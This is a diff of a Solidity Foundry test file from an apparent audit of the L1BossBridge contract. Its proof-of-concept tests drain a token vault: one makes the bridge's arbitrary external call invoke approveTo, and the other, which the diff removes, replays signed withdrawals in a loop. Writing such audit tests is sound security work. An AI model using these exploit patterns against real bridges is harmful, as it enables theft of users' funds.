@@ -208,22 +208,6 @@ contract L1BossBridgeTest is Test {
         );
     }
 
-    /**
-     * Mocks part of the off-chain mechanism where there operator approves requests for withdrawals by signing them.
-     * Although not coded here (for simplicity), you can safely assume that our operator refuses to sign any withdrawal
-     * request from an account that never originated a transaction containing a successful deposit.
-     */
-    function _signMessage(
-        bytes memory message,
-        uint256 privateKey
-    )
-        private
-        pure
-        returns (uint8 v, bytes32 r, bytes32 s)
-    {
-        return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
-    }
-
     ///////////////////////////////////////
     //           AUDIT-TESTS             //
     ///////////////////////////////////////
@@ -291,33 +275,50 @@ contract L1BossBridgeTest is Test {
         assertEq(token.balanceOf(address(vault)), 0);
     }
 
-    function testMakeArbitraryCall() public {
+    /**
+     * The L1 part of the bridge includes low-level external call that could be used to call
+     * sensitive contracts of the bridge. Such as the vault. Because the L1BossBridge owns the L1Vault,
+     * an attacker could submit a message that targets the vault and executes is `approveTo` function.
+     * This would allow anyone to drain the vault.
+     */
+    function testCanCallVaultApproveFromBridgeAndDrainVault() public {
         address attacker = makeAddr("attacker");
-        // assume the vault already holds some tokens
         uint256 vaultInitialBalance = 1000e18;
-        uint256 attackerInitialBalance = 100e18;
         deal(address(token), address(vault), vaultInitialBalance);
-        deal(address(token), attacker, attackerInitialBalance);
 
-        // An attacker deposits tokens to L2
+        // An attacker deposits tokens to L2. I do this under the assumption that the
+        // bridge operator needs to see a valid deposit tx to then allow me to request a withdrawal.
         vm.startPrank(attacker);
-        token.approve(address(tokenBridge), type(uint256).max);
-        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(attacker), address(0), 0);
+        tokenBridge.depositTokensToL2(attacker, address(0), 0);
 
-        // Signer/Operator is going to singt he withdrawal
+        // Under the assumption that the bridge operator doesn't validate bytes being signed
         bytes memory message = abi.encode(
-            address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance))
+            address(vault), // target
+            0, // value
+            abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)) // data
         );
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);
 
-        (uint8 v, bytes32 r, bytes32 s) =
-            vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+        tokenBridge.sendToL1(v, r, s, message);
+        assertEq(token.allowance(address(vault), attacker), type(uint256).max);
+        token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
+    }
 
-        while (token.balanceOf(address(vault)) > 0) {
-            tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
-        }
-
-        assertEq(token.balanceOf(attacker), attackerInitialBalance + vaultInitialBalance);
-
-        assertEq(token.balanceOf(address(vault)), 0);
+    /**
+     * Mocks part of the off-chain mechanism where there operator approves requests for withdrawals by signing them.
+     * Although not coded here (for simplicity), you can safely assume that our operator refuses to sign any withdrawal
+     * request from an account that never originated a transaction containing a successful deposit.
+     */
+    function _signMessage(
+        bytes memory message,
+        uint256 privateKey
+    )
+        private
+        pure
+        returns (uint8 v, bytes32 r, bytes32 s)
+    {
+        return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
     }
 }
